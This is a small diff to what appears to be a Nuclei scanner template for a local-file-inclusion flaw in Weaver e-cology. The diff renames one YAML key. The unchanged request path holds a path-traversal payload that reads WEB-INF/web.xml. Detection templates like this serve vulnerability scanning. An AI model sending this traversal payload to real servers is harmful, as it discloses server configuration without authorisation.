@@ -5,7 +5,7 @@ info:
   severity: medium
   tags: ecology,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
